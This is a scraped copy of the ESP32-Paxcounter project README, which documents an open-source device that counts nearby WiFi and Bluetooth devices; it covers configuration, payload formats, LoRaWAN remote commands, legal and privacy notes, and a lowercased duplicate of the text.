sensor 2 on\n6 User sensor 3 on\n7 Batterylevel off\n*) GPS data can also be combined with paxcounter payload on port 1, #define GPSPORT 1 in paxcounter.conf to enable\nPower saving mode\nPaxcounter supports a battery friendly power saving mode. In this mode the device enters deep sleep, after all data is polled from all sensors and the dataset is completeley sent through all user configured channels (LORAWAN / SPI / MQTT). Set #define SLEEPCYCLE in paxcounter.conf to enable power saving mode and to specify the duration of a sleep cycle. Power consumption in deep sleep mode depends on your hardware, i.e. if on board peripherals can be switched off or set to a chip specific sleep mode either by MCU or by power management unit (PMU) as found on TTGO T-BEAM v1.0/V1.1. See power.cpp for power management, and reset.cpp for sleep and wakeup logic.\nTime sync\nPaxcounter can keep a time-of-day synced with external or on board time sources. Set #define TIME_SYNC_INTERVAL in paxcounter.conf to enable time sync. Supported external time sources are GPS, LORAWAN network time and LORAWAN application timeserver time. Supported on board time sources are the RTC of ESP32 and a DS3231 RTC chip, both are kept sycned as fallback time sources. Time accuracy depends on board's time base which generates the pulse per second. Supported are GPS PPS, SQW output of RTC, and internal ESP32 hardware timer. Time base is selected by #defines in the board's hal file, see example in generic.h. Bonus: If your LORAWAN network does not support network time, you can run a Node-Red timeserver application using the enclosed Timeserver code. Configure the MQTT nodes in Node-Red for the LORAWAN application used by your paxocunter device. Time can also be set without precision liability, by simple remote command, see section remote control.\nWall clock controller\nPaxcounter can be used to sync a wall clock which has a DCF77 or IF482 time telegram input. Set #define HAS_IF482 or #define HAS_DCF77 in board's hal file to setup clock controller. Use case of this function is to integrate paxcounter and clock. Accurary of the synthetic DCF77 signal depends on accuracy of on board's time base, see above.\nMobile PaxCounter using openSenseMap\nThis describes how to set up a mobile PaxCounter:\nFollow all steps so far for preparing the device, selecting the packed payload format. In paxcounter.conf set PAYLOAD_OPENSENSEBOX to 1. Register a new sensebox on https://opensensemap.org/. In the sensor configuration select \"TheThingsNetwork\" and set decoding profile to \"LoRa serialization\". Enter your TTN Application and Device ID. Setup decoding option using [{\"decoder\":\"latLng\"},{\"decoder\":\"uint16\",sensor_id\":\"yoursensorid\"}]\nCovid-19 Exposure Notification System beacon detection (currently NOT working with v3.0.x, use v2.4.x for this feature)\nBluetooth low energy service UUID 0xFD6F, used by Google/Apple COVID-19 Exposure Notification System, can be monitored and counted. By comparing with the total number of observed devices this gives an indication how many people staying in proximity are using Apps for tracing COVID-19 exposures, e.g. in Germany the \"Corona Warn App\". To achive best results with this funcion, use following settings in paxcounter.conf:\n#define COUNT_ENS1// enable ENS monitoring function\n#define BLECOUNTER1// enable bluetooth sniffing\n#define WIFICOUNTER0// disable wifi sniffing (improves BLE scan speed)\n#define HAS_SENSOR_11// optional, in board's hal file: transmit ENS counter data to server\nSD-card\nData can be stored on an SD-card if one is availabe. Simply choose the file in src/hal and add the following lines to your hal-file:\n#define HAS_SDCARD 1 // SD-card-reader/writer, using SPI interface\nOR\n#define HAS_SDCARD 2 // SD-card-reader/writer, using SDMMC interface\n// Pins for SPI interface\n#define SDCARD_CS (13) // fill in the correct numbers for your board\n#define SDCARD_MOSI (15)\n#define SDCARD_MISO (2)\n#define SDCARD_SCLK (14)\nPlease choose the correct number for the connection of the reader/writer.\nThis is an example of a board with SD-card: https://www.aliexpress.com/item/32990008126.html In this case you take the file src/hal/ttgov21new.h and add the lines given above (numbers given are for this board).\nAnother approach would be this tiny board: https://www.aliexpress.com/item/32424558182.html (needs 5V). In this case you choose the correct file for your ESP32-board in the src/hal-directory and add the lines given above to the correct h-file. Please correct the numbers given in the example to the numbers used corresponding to your wiring.\nSome hints: These cheap devices often handle SD-cards up to 32GB, not bigger ones. They can handle files in the old DOS-way, to say the filenames are in the 8.3-format. And they often cannot handle subdirectories.\nThe software included here writes data in a file named PAXCOUNT.xx, where xx can range from 00 to 99. The software starts with 00, checks to see if such a file already exists and if yes it will continue with the next number (up to 99 - in this case it will return no sd-card). So an existing file will not be overwritten.\nThe data is written to the card and after 3 write-operations the data is flushed to the disk. So maybe the last 3 minutes of data get lost when you disconnect the PAXCOUNTER from power.\nAnd finally: this is the data written to the disk:\ndate, time, wifi, bluet\n00.00.1970,00:01:09,2,0\n00.00.1970,00:02:09,1,0\n00.00.1970,00:03:09,2,0\nFormat of the data is CSV, which can easily imported into LibreOffice, Excel, .....\nIf you want to change this please look into src/sdcard.cpp and include/sdcard.h.\nIntegration into \"The Things Stack Community Edition\" aka \"The Things Stack V3\"\nTo use the ESP32-Paxcounter in The Things Stack Community Edition you need an account to reach the console. Go to:\nThe Things Stack Community Edition Console\nchoose your region and go to applications\ncreate an application by clicking \"+ Add application\" and give it a id, name, etc.\ncreate a device by clicking \"+ Add end device\"\nSelect the end device: choose the Brand \"Open Source Community Projects\" and the Model \"ESP32-Paxcounter\", leave Hardware Version to \"Unknown\" and select your Firmware Version and Profile (Region)\nEnter registration data: choose the frequency plan (for EU choose the recommended), set the AppEUI (Fill with zeros), set the DeviceEUI (generate), set the AppKey (generate), choose a device ID and hit \"Register end device\"\ngot to Applications -> \"your App ID\" -> Payload formatters -> Uplink, choose \"Repository\" and hit \"Save changes\"\nThe \"Repository\" payload decoder uses the packed format, explained below. If you want to use MyDevices from Cayenne you should use the Cayenne payload decoder instead.\nTTN Mapper\nIf you want your devices to be feeding the TTN Mapper, just follow this manual: https://docs.ttnmapper.org/integration/tts-integration-v3.html - different than indicated in the manual you can leave the payload decoder to \"Repository\" for the ESP32-Paxcounter and you are fine.\nPayload format\nYou can select different payload formats in paxcounter.conf:\nPlain uses big endian format and generates json fields, e.g. useful for TTN console\nPacked uses little endian format and generates json fields\nCayenneLPP generates MyDevices Cayenne readable fields\nDecrepated information from the things network v2 >>\nIf you're using TheThingsNetwork (TTN) you may want to use a payload converter. Go to TTN Console - Application - Payload Formats and paste the code example below in tabs Decoder and Converter. This way your MQTT application can parse the fields pax, ble and wifi.\nTo add your device to myDevices Cayenne platform select \"Cayenne-LPP\" from Lora device list and use the CayenneLPP payload encoder.\nTo track a paxcounter device with on board GPS and at the same time contribute to TTN coverage mapping, you simply activate the TTNmapper integration in TTN Console. Both formats plain and packed generate the fields latitude, longitude and hdop required by ttnmapper. Important: set TTN mapper port filter to '4' (paxcounter GPS Port).\n<< Decrepated information from the things network v2\nHereafter described is the default plain format, which uses MSB bit numbering. Under /TTN in this repository you find some ready-to-go decoders which you may copy to your TTN console:\nplain_decoder.js | plain_converter.js | packed_decoder.js | packed_converter.js\nPort #1: Paxcount data\nbyte 1-2:Number of unique devices, seen on Wifi [00 00 if Wifi scan disabled]\nbyte 3-4:Number of unique devices, seen on Bluetooth [ommited if BT scan disabled]\nPort #2: Device status query result\nbyte 1-2:Battery or USB Voltage [mV], 0 if no battery probe\nbyte 3-10:Uptime [seconds]\nbyte 11: CPU temperature [\u00b0C]\nbytes 12-15:Free RAM [bytes]\nbyte 16:Last CPU core 0 reset reason\nbytes 17-20:Number of restarts since last power cycle\nPort #3: Device configuration query result\nbyte 1:Lora SF (7..12) [default 9]\nbyte 2:Lora TXpower (2..15) [default 15]\nbyte 3:Lora ADR (1=on, 0=off) [default 1]\nbyte 4:Screensaver status (1=on, 0=off) [default 0]\nbyte 5:Display status (1=on, 0=off) [default 0]\nbyte 6:Counter mode (0=cyclic unconfirmed, 1=cumulative, 2=cyclic confirmed) [default 0]\nbytes 7-8:RSSI limiter threshold value (negative) [default 0]\nbyte 9:Lora Payload send cycle in seconds/2 (0..255) [default 120]\nbyte 10:Wifi channel hopping interval in seconds/100 (0..255), 0 means no hopping [default 50]\nbyte 11:Bluetooth channel switch interval in seconds/100 (0..255) [efault 10]\nbyte 12:Bluetooth scanner status (1=on, 0=0ff) [default 1]\nbyte 13:Wifi antenna switch (0=internal, 1=external) [default 0]\nbyte 14:count randomizated MACs only (0=disabled, 1=enabled) [default 1]\nbyte 15:RGB LED luminosity (0..100 %) [default 30]\nbyte 16:0 (reserved)\nbyte 17:0 (reserved)\nbytes 18-28:Software version (ASCII format, terminating with zero)\nPort #4: GPS data (only if device has fature GPS, and GPS data is enabled and GPS has a fix)\nbytes 1-4:Latitude\nbytes 5-8:Longitude\nbyte 9:Number of satellites\nbytes 10-11:HDOP\nbytes 12-13:Altitude [meter]\nPort #5: Button pressed alarm\nbyte 1:static value 0x01\nPort #6: (unused)\nPort #7: Environmental sensor data (only if device has feature BME)\nbytes 1-2:Temperature [\u00b0C]\nbytes 3-4:Pressure [hPa]\nbytes 5-6:Humidity [%]\nbytes 7-8:Indoor air quality index (0..500), see below\nIndoor air quality classification:\n0-50good\n51-100average\n101-150 little bad\n151-200 bad\n201-300 worse\n301-500 very bad\nPort #8: Battery voltage data (only if device has feature BATT)\nbytes 1-2:Battery or USB Voltage [mV], 0 if no battery probe\nPort #9: Time/Date\nbytes 1-4:board's local time/date in UNIX epoch (number of seconds that have elapsed since January 1, 1970 (midnight UTC/GMT), not counting leap seconds)\nPorts #10, #11, #12: User sensor data\nFormat is specified by user in function `sensor_read(uint8_t sensor)`, see `src/sensor.cpp`. Port #10 is also used for ENS counter (2 bytes = 16 bit), if ENS is compiled AND ENS data transfer is enabled\nRemote control\nThe device listenes for remote control commands on LoRaWAN Port 2. Multiple commands per downlink are possible by concatenating them, but must not exceed a maximum of 10 bytes per downlink.\nNote: settings can be stored in NVRAM to make them persistant (reloaded during device startup / restart). To store settings, use command 0x21.\nSend for example 83 86 as Downlink on Port 2 to get battery status and time/date from the device.\n0x01 set scan RSSI limit\n1 ... 255 used for wifi and bluetooth scan radius (greater values increase scan radius, values 50...110 make sense)\n0 = RSSI limiter disabled [default]\n0x02 set counter mode\n0 = cyclic unconfirmed, mac counter reset after each wifi scan cycle, data is sent only once [default]\n1 = cumulative counter, mac counter is never reset\n2 = cyclic confirmed, like 0 but data is resent until confirmation by network received\n0x03 set GPS data on/off\n0 = GPS data off\n1 = GPS data on, sends GPS data on port 4 (default, use port 1 for mobile pax counter), if GPS is present and has a fix\n0x04 set display on/off\n0 = display off\n1 = display on [default]\n0x05 set LoRa datarate\n0 ... 15 see LoRaWAN regional parameters for details [default: 5]\nExample for EU868:\nDataRateConfigurationBit/s\n0LoRa: SF12 / 125 kHz250\n1LoRa: SF11 / 125 kHz440\n2LoRa: SF10 / 125 kHz980\n3LoRa: SF9 / 125 kHz1760\n4LoRa: SF8 / 125 kHz3125\n5LoRa: SF7 / 125 kHz5470\n6*LoRa: SF7 / 250 kHz11000\n7*FSK: 50 kbps50000\n8 .. 14reserved for future use (RFU)\n15ignored (device keeps current setting)\n*) not supported by TheThingsNetwork\n0x06 set LoRa TXpower\n0 ... 255 desired TX power in dBm [default: 14]\n0x07 set LoRa Adaptive Data Rate mode\n0 = ADR off\n1 = ADR on [default]\nIf ADR is set to off, SF value is shown inverted on display.\n0x08 do nothing\nuseful to clear pending commands from LoRaWAN server quere, or to check RSSI on device\n0x09 reset functions (send this command UNconfirmed only to avoid boot loops!)\n0 = restart device (coldstart)\n1 = (reserved, currently does nothing)\n2 = reset device to factory settings and restart device\n3 = flush send queues\n4 = restart device (warmstart)\n8 = reboot device to maintenance mode (local web server)\n9 = reboot device to OTA update via Wifi mode\n0x0A set payload send cycle\n5 ... 255 payload send cycle in seconds/2\ne.g. 120 -> payload is transmitted each 240 seconds [default]\n0x0B set Wifi channel hopping interval timer\n0 ... 255 duration for scanning a wifi channel in seconds/100\ne.g. 50 -> each channel is scanned for 500 milliseconds [default]\n0 means no hopping, scanning on fixed single channel WIFI_CHANNEL_1\n0x0C set Bluetooth channel switch interval timer\n0 ... 255 duration for scanning a bluetooth advertising channel in seconds/100\ne.g. 8 -> each channel is scanned for 80 milliseconds [default]\n0x0E set Bluetooth scanner\n0 = disabled\n1 = enabled [default]\n0x0F set WIFI antenna switch (works on LoPy/LoPy4/FiPy only)\n0 = internal antenna [default]\n1 = external antenna\n0x10 set RGB led luminosity (works on LoPy/LoPy4/FiPy and LoRaNode32 shield only)\n0 ... 100 percentage of luminosity (100% = full light)\ne.g. 50 -> 50% of luminosity [default]\n0x13 set user sensor mode\nbyte 1 = user sensor number (1..3)\nbyte 2 = sensor mode (0 = disabled / 1 = enabled [default])\n0x14 set payload mask\nbyte 1 = sensor data payload mask (0..255, meaning of bits see below)\n0x01 = COUNT_DATA\n0x02 = RESERVED_DATA\n0x04 = MEMS_DATA\n0x08 = GPS_DATA\n0x10 = SENSOR_1_DATA (also ENS counter)\n0x20 = SENSOR_2_DATA\n0x40 = SENSOR_3_DATA\n0x80 = BATT_DATA\nbytes can be combined eg COUNT_DATA + SENSOR_1_DATA + BATT_DATA: `0x01 | 0x10 | 0x80 = 0x91`\n0x15 set BME data on/off\n0 = BME data off\n1 = BME data on, sends BME data on port 7 [default]\n0x16 set battery data on/off\n0 = battery data off [default]\n1 = battery data on, sends voltage on port 8\n0x17 set Wifi scanner\n0 = disabled\n1 = enabled [default]\n0x18 set ENS counter on/off\n0 = disabled [default]\n1 = enabled\n0x19 set sleep cycle\nbytes 1..2 = device sleep cycle in seconds/10 (MSB), 1 ... 255\ne.g. {0x04, 0xB0} -> device sleeps 20 minutes after each send cycle [default = 0]\n0x20 load device configuration\nCurrent device runtime configuration will be loaded from NVRAM, replacing current settings immediately (use with care!)\n0x21 store device configuration\nCurrent device runtime configuration is stored in NVRAM, will be reloaded after restart\n0x80 get device configuration\nDevice answers with it's current configuration on Port 3.\n0x81 get device status\nDevice answers with it's current status on Port 2.\n0x83 get battery status\nDevice answers with battery voltage on Port 8.\n0x84 get device GPS status\nDevice answers with it's current status on Port 4.\n0x85 get BME280 / BME680 sensor data\nDevice answers with BME sensor data set on Port 7.\n0x86 get time/date\nDevice answers with it's current time on Port 2:\nbytes 1..4 = time/date in UTC epoch seconds (LSB)\nbyte 5 = time source & status, see below\nbits 0..3 last seen time source\n0x00 = GPS\n0x01 = RTC\n0x02 = LORA\n0x03 = unsynched (never synched)\n0x04 = set (source unknown)\nbits 4..7 time status\n0x00 = timeNotSet (never synched)\n0x01 = timeNeedsSync (last sync failed)\n0x02 = timeSet (synched)\n0x87 sync time/date\nDevice synchronizes it's time/date by calling the preconfigured time source.\n0x88 set time/date\nbytes 1..4 = time/date to set in UTC epoch seconds (MSB, e.g. https://www.epochconverter.com/hex)\nLicense\nCopyright 2018-2020 Oliver Brandmueller ob@sysadm.in\nCopyright 2018-2020 Klaus Wilting verkehrsrot@arcor.de\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.\nNOTICE: Parts of the source files in this repository are made available under different licenses, see file LICENSE.txt in this repository. Refer to each individual source file for more details.\nCredits\nThanks to\nOliver Brandm\u00fcller for idea and initial setup of this project\nCharles Hallard for major code contributions to this project\nrobbi5 for the payload converter\nCaspar Armster for the The Things Stack V3 payload converter\nterrillmoore for maintaining the LMIC for arduino LoRaWAN stack\nsbamueller for writing the tutorial in Make Magazine\nStefan for paxcounter opensensebox integration\nAugust Quint for adding SD card data logger, SDS011 and ENS support", "link": "https://github.com/cyberman54/ESP32-Paxcounter", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "esp32-paxcounter\nwifi & bluetooth driven, lorawan enabled, battery powered mini paxcounter built on cheap esp32 lora iot boards\ntutorial (in german language): https://www.heise.de/select/make/2019/1/1551099236518668\nuse case\npaxcounter is an esp32 mcu based device for metering passenger flows in realtime. it counts how many mobile devices are around. this gives an estimation how many people are around. paxcounter detects wifi and bluetooth signals in the air, focusing on mobile devices by evaluating their mac adresses.\nintention of this project is to do this without intrusion in privacy: you don't need to track people owned devices, if you just want to count them. therefore, paxcounter does not persistenly store mac adresses and does no kind of fingerprinting the scanned devices.\ndata can either be be stored on a local sd-card, transferred to cloud using lorawan network or mqtt over tcp/ip, or transmitted to a local host using serial (spi) interface.\nyou can build this project battery powered using esp32 deep sleep mode and reach long uptimes with a single 18650 li-ion cell.\nhardware\nsupported esp32 based boards:\nlora & spi:\nheltec: lora-32 v1 and v2\nttgo: paxcounter-board*, t1*, t2*, t3*, t-beam, t-fox\npycom: lopy, lopy4, fipy\nradioshuttle.de: eco power board\nwemos: lolin32 + loranode32 shield, lolin32lite + loranode32-lite shield\nadafruit esp32 feather + lora wing + oled wing, #iot octopus32 (octopus + esp32 feather)\nm5stack: basic core iot* + lora module ra-01h, fire iot*\n*) supports microsd-card\nspi only:\npyom: wipy\nwemos: lolin32, lolin32 lite, wemos d32, wemos32 oled\ncrowdsupply: tinypico\nttgo: t-display\nttgo: t-wristband\ngeneric esp32\ndepending on board hardware following features are supported:\nlorawan communication, supporting various payload formats (see enclosed .js converters)\nmqtt communication via tcp/ip and ethernet interface (note: payload transmitted over mqtt will be base64 encoded)\nspi serial communication to a local host\nled (shows power & status)\noled display (shows detailed status)\nrgb led (shows colorized status)\nbutton (short press: flip display page / long press: send alarm message)\nbattery voltage monitoring (analog read / axp192 / ip5306)\ngps (generic serial nmea, or quectel l76 i2c)\nenvironmental sensors (bosch bmp180/bme280/bme680 i2c; sds011 serial)\nreal time clock (maxim ds3231 i2c)\nif482 (serial) and dcf77 (gpio) time telegram generator\nswitch external power / battery\nled matrix display (similar to this 64x16 model, can be ordered on aliexpress)\nsd-card (see section sd-card here) for logging pax data\ntarget platform must be selected in platformio.ini.\nhardware dependent settings (pinout etc.) are stored in board files in /hal directory. if you want to use a esp32 board which is not yet supported, use hal file generic.h and tailor pin mappings to your needs. pull requests for new boards welcome.\nsome 3d printable cases can be found (and, if wanted so, ordered) on thingiverse, see heltec, ttgov2, ttgov2.1, ttgo, t-beam, t-beam parts, for example.\npower consumption was metered at around 450 - 1000mw, depending on board and user settings in paxcounter.conf. by default bluetooth sniffing not installed (#define blecounter 0 in paxcounter.conf). installing and enabling bluetooth costs 30% more power + 30% flash storage for the software stack. if you enable bluetooth be aware that this goes on expense of wifi sniffing results, because then wifi and bt stack must share the 2,4 ghz rf ressources of esp32. if you need to sniff wifi and bt in parallel and need best possible results, use two boards - one for wifi only and one for bt only - and add counted results.\npreparing\ninstall platformio\ninstall platformio ide for embedded development to make this project. platformio integrates with your favorite ide, choose eg. visual studio, atom, eclipse etc.\ncompile time configuration is spread across several files. before compiling the code, edit or create the following files:\nplatformio.ini\nedit platformio_orig.ini and select desired hardware target in section boards. to add a new board, create an appropriate hardware abstraction layer file in hal subdirectory, and add a pointer to this file in sections board. copy or rename to platformio.ini in the root directory of the project. now start platformio. note: platformio is looking for platformio.ini in the root directory and won't start if it does not find this file.\npaxcounter.conf\nedit src/paxcounter_orig.conf and tailor settings in this file according to your needs and use case. please take care of the duty cycle regulations of the lorawan network you're going to use. copy or rename to src/paxcounter.conf.\nif your device has a real time clock it can be updated bei either lorawan network or gps time, according to settings time_sync_interval and time_sync_lorawan in paxcounter.conf.\nsrc/lmic_config.h\nedit src/lmic_config.h and tailor settings in this file according to your country and device hardware. please take care of national regulations when selecting the frequency band for lorawan.\nsrc/loraconf.h\ncreate file src/loraconf.h using the template src/loraconf_sample.h and adjust settings to use your personal values. to join the network and activate your paxcounter, you must configure either otaa or abp join method. you should use otaa, whenever possible. to understand the differences of the two methods, this article may be useful.\nto configure otaa, leave #define lora_abp deactivated (commented). to use abp, activate (uncomment) #define lora_abp in the file src/loraconf.h. the file src/loraconf_sample.h contains more information about the values to provide.\nsrc/ota.conf\ncreate file src/ota.conf using the template src/ota.sample.conf and enter your wifi network&key. these settings are used for downloading updates via wifi, either from a remote https server, or locally via webui. if you want to use a remote server, you need a pax.express repository. enter your pax.express credentials in ota.conf. if you don't need wireless firmware updates just rename ota.sample.conf to ota.conf.\nbuilding\nuse platformio with your preferred ide for development and building this code. make sure you have latest platformio version.\nuploading\nby cable, via usb/uart interface: to upload the code via cable to your esp32 board this needs to be switched from run to bootloader mode. boards with usb bridge like heltec and ttgo usually have an onboard logic which allows soft switching by the upload -----> tool !!! . in platformio this happenes automatically.\nthe lopy/lopy4/fipy board needs to be set manually. see these instructions how to do it. don't forget to press on board reset button after switching between run and bootloader mode.\nthe original pycom firmware is not needed, so there is no need to update it before flashing paxcounter. just flash the compiled paxcounter binary (.elf file) on your lopy/lopy4/fipy. if you later want to go back to the pycom firmware, download the firmware from pycom and flash it over.\nover the air (ota), download via wifi: after the esp32 board is initially flashed and has joined a lorawan network, the firmware can update itself by ota. this process is kicked off by sending a remote control command (see below) via lorawan to the board. the board then tries to connect via wifi to a cloud service (pax.express), checks for update, and if available downloads the binary and reboots with it. if something goes wrong during this process, the board reboots back to the current version. prerequisites for ota are: 1. you own a pax.express repository, 2. you pushed the update binary to your pax.express repository, 3. internet access via encrypted (wpa2) wifi is present at the board's site, 4. wifi credentials were set in ota.conf and initially flashed to the board. step 2 runs automated, just enter the credentials in ota.conf and set upload_protocol = custom in platformio.ini. then press build and lean back watching platformio doing build and upload.\nover the air (ota), upload via wifi: if option bootmenu is defined in paxcounter.conf, the esp32 board will try to connect to a known wifi access point each time cold starting (after a power cycle or a reset), using the wifi credentials given in ota.conf. once connected to the wifi it will fire up a simple webserver, providing a bootstrap menu waiting for a user interaction (pressing \"start\" button in menu). this process will time out after bootdelay seconds, ensuring booting the device to runmode. once a user interaction in bootstrap menu was detected, the timeout will be extended to boottimeout seconds. during this time a firmware upload can be performed manually by user, e.g. using a smartphone in tethering mode providing the firmware upload file.\nlegal note\ndepending on your country's laws it may be illegal to sniff wireless networks for mac addresses. please check and respect your country's laws before using this code!\n(e.g. us citizens may want to check section 18 u.s. code \u00a7 2511 and discussion on this)\n(e.g. uk citizens may want to check data protection act 1998 and gdpr 2018)\n(e.g. citizens in the the netherlands and eu may want to read this article and this article) and this decision\n(e.g. citizens in germany may want to read this article of wissenschaftliche dienste des deutschen bundestages\nnote: if you use this software you do this at your own risk. that means that you alone - not the authors of this software - are responsible for the legal compliance of an application using this or build from this software and/or usage of a device created using this software. you should take special care and get prior legal advice if you plan metering passengers in public areas and/or publish data drawn from doing so.\nprivacy disclosure\npaxcounter generates identifiers for sniffed wifi or bluetooth mac adresses and and collects them temporary in the device's ram for a configurable scan cycle time (default 60 seconds). after each scan cycle the collected identifiers are cleared. identifiers are generated by using the last 2 bytes of universal mac adresses. personal mac adresses remain untouched and are not evaluated. identifiers and mac adresses are never transferred to the lorawan network. no persistent storing of mac adresses, identifiers or timestamps and no other kind of analytics than counting are implemented in this code. wireless networks are not touched by this code, but mac adresses from wireless devices as well within as not within wireless networks, regardless if encrypted or unencrypted, are sniffed and processed by this code.\nled blink pattern\nmono color led:\nsingle flash (50ms): seen a new wifi or ble device\nquick blink (20ms on each 1/5 second): joining lorawan network in progress or pending\nsmall blink (10ms on each 1/2 second): lorawan data transmit in progress or pending\nlong blink (200ms on each 2 seconds): lorawan stack error\nrgb led:\ngreen: seen a new wifi device\nmagenta: seen a new ble device\nyellow: joining lorawan network in progress or pending\npink: lorawan mac transmit in progress\nblue: lorawan data transmit in progress or pending\nred: lorawan stack error\ndisplay\nif you're using a device with oled display, or if you add such one to the i2c bus, the device shows live data on the display. you can flip display pages showing\nrecent count of pax\nhistogram\ngps data\nbme sensor data\ntime of day\nblank page\nby pressing the button of the device.\nsensors and peripherals\nyou can add up to 3 user defined sensors. insert your sensor's payload scheme in sensor.cpp. bosch bmp180 / bme280 / bme680 environment sensors are supported, to activate configure bme in board's hal file before build. furthermore, sds011, rtc ds3231, generic serial nmea gps, i2c lopy gps are supported, and to be configured in board's hal file. see generic.h for all options and for proper configuration of bme280/bme680.\noutput of user sensor data can be switched by user remote control command 0x14 sent to port 2.\noutput of sensor and peripheral data is internally switched by a bitmask register. default mask can be tailored by editing cfg.payloadmask initialization value in configmanager.cpp following this scheme:\nbit sensordata default\n0 paxcounter on\n1 unused off\n2 bme280/680 on\n3 gps* on\n4 user sensor 1 on\n5 user sensor 2 on\n6 user sensor 3 on\n7 batterylevel off\n*) gps data can also be combined with paxcounter payload on port 1, #define gpsport 1 in paxcounter.conf to enable\npower saving mode\npaxcounter supports a battery friendly power saving mode. in this mode the device enters deep sleep, after all data is polled from all sensors and the dataset is completeley sent through all user configured channels (lorawan / spi / mqtt). set #define sleepcycle in paxcounter.conf to enable power saving mode and to specify the duration of a sleep cycle. power consumption in deep sleep mode depends on your hardware, i.e. if on board peripherals can be switched off or set to a chip specific sleep mode either by mcu or by power management unit (pmu) as found on ttgo t-beam v1.0/v1.1. see power.cpp for power management, and reset.cpp for sleep and wakeup logic.\ntime sync\npaxcounter can keep a time-of-day synced with external or on board time sources. set #define time_sync_interval in paxcounter.conf to enable time sync. supported external time sources are gps, lorawan network time and lorawan application timeserver time. supported on board time sources are the rtc of esp32 and a ds3231 rtc chip, both are kept sycned as fallback time sources. time accuracy depends on board's time base which generates the pulse per second. supported are gps pps, sqw output of rtc, and internal esp32 hardware timer. time base is selected by #defines in the board's hal file, see example in generic.h. bonus: if your lorawan network does not support network time, you can run a node-red timeserver application using the enclosed timeserver code. configure the mqtt nodes in node-red for the lorawan application used by your paxocunter device. time can also be set without precision liability, by simple remote command, see section remote control.\nwall clock controller\npaxcounter can be used to sync a wall clock which has a dcf77 or if482 time telegram input. set #define has_if482 or #define has_dcf77 in board's hal file to setup clock controller. use case of this function is to integrate paxcounter and clock. accurary of the synthetic dcf77 signal depends on accuracy of on board's time base, see above.\nmobile paxcounter using opensensemap\nthis describes how to set up a mobile paxcounter:\nfollow all steps so far for preparing the device, selecting the packed payload format. in paxcounter.conf set payload_opensensebox to 1. register a new sensebox on https://opensensemap.org/. in the sensor configuration select \"thethingsnetwork\" and set decoding profile to \"lora serialization\". enter your ttn application and device id. setup decoding option using [{\"decoder\":\"latlng\"},{\"decoder\":\"uint16\",sensor_id\":\"yoursensorid\"}]\ncovid-19 exposure notification system beacon detection (currently not working with v3.0.x, use v2.4.x for this feature)\nbluetooth low energy service uuid 0xfd6f, used by google/apple covid-19 exposure notification system, can be monitored and counted. by comparing with the total number of observed devices this gives an indication how many people staying in proximity are using apps for tracing covid-19 exposures, e.g. in germany the \"corona warn app\". to achive best results with this funcion, use following settings in paxcounter.conf:\n#define count_ens1// enable ens monitoring function\n#define blecounter1// enable bluetooth sniffing\n#define wificounter0// disable wifi sniffing (improves ble scan speed)\n#define has_sensor_11// optional, in board's hal file: transmit ens counter data to server\nsd-card\ndata can be stored on an sd-card if one is availabe. simply choose the file in src/hal and add the following lines to your hal-file:\n#define has_sdcard 1 // sd-card-reader/writer, using spi interface\nor\n#define has_sdcard 2 // sd-card-reader/writer, using sdmmc interface\n// pins for spi interface\n#define sdcard_cs (13) // fill in the correct numbers for your board\n#define sdcard_mosi (15)\n#define sdcard_miso (2)\n#define sdcard_sclk (14)\nplease choose the correct number for the connection of the reader/writer.\nthis is an example of a board with sd-card: https://www.aliexpress.com/item/32990008126.html in this case you take the file src/hal/ttgov21new.h and add the lines given above (numbers given are for this board).\nanother approach would be this tiny board: https://www.aliexpress.com/item/32424558182.html (needs 5v). in this case you choose the correct file for your esp32-board in the src/hal-directory and add the lines given above to the correct h-file. please correct the numbers given in the example to the numbers used corresponding to your wiring.\nsome hints: these cheap devices often handle sd-cards up to 32gb, not bigger ones. they can handle files in the old dos-way, to say the filenames are in the 8.3-format. and they often cannot handle subdirectories.\nthe software included here writes data in a file named paxcount.xx, where xx can range from 00 to 99. the software starts with 00, checks to see if such a file already exists and if yes it will continue with the next number (up to 99 - in this case it will return no sd-card). so an existing file will not be overwritten.\nthe data is written to the card and after 3 write-operations the data is flushed to the disk. so maybe the last 3 minutes of data get lost when you disconnect the paxcounter from power.\nand finally: this is the data written to the disk:\ndate, time, wifi, bluet\n00.00.1970,00:01:09,2,0\n00.00.1970,00:02:09,1,0\n00.00.1970,00:03:09,2,0\nformat of the data is csv, which can easily imported into libreoffice, excel, .....\nif you want to change this please look into src/sdcard.cpp and include/sdcard.h.\nintegration into \"the things stack community edition\" aka \"the things stack v3\"\nto use the esp32-paxcounter in the things stack community edition you need an account to reach the console. go to:\nthe things stack community edition console\nchoose your region and go to applications\ncreate an application by clicking \"+ add application\" and give it a id, name, etc.\ncreate a device by clicking \"+ add end device\"\nselect the end device: choose the brand \"open source community projects\" and the model \"esp32-paxcounter\", leave hardware version to \"unknown\" and select your firmware version and profile (region)\nenter registration data: choose the frequency plan (for eu choose the recommended), set the appeui (fill with zeros), set the deviceeui (generate), set the appkey (generate), choose a device id and hit \"register end device\"\ngot to applications -> \"your app id\" -> payload formatters -> uplink, choose \"repository\" and hit \"save changes\"\nthe \"repository\" payload decoder uses the packed format, explained below. if you want to use mydevices from cayenne you should use the cayenne payload decoder instead.\nttn mapper\nif you want your devices to be feeding the ttn mapper, just follow this manual: https://docs.ttnmapper.org/integration/tts-integration-v3.html - different than indicated in the manual you can leave the payload decoder to \"repository\" for the esp32-paxcounter and you are fine.\npayload format\nyou can select different payload formats in paxcounter.conf:\nplain uses big endian format and generates json fields, e.g. useful for ttn console\npacked uses little endian format and generates json fields\ncayennelpp generates mydevices cayenne readable fields\ndecrepated information from the things network v2 >>\nif you're using thethingsnetwork (ttn) you may want to use a payload converter. go to ttn console - application - payload formats and paste the code example below in tabs decoder and converter. this way your mqtt application can parse the fields pax, ble and wifi.\nto add your device to mydevices cayenne platform select \"cayenne-lpp\" from lora device list and use the cayennelpp payload encoder.\nto track a paxcounter device with on board gps and at the same time contribute to ttn coverage mapping, you simply activate the ttnmapper integration in ttn console. both formats plain and packed generate the fields latitude, longitude and hdop required by ttnmapper. important: set ttn mapper port filter to '4' (paxcounter gps port).\n<< decrepated information from the things network v2\nhereafter described is the default plain format, which uses msb bit numbering. under /ttn in this repository you 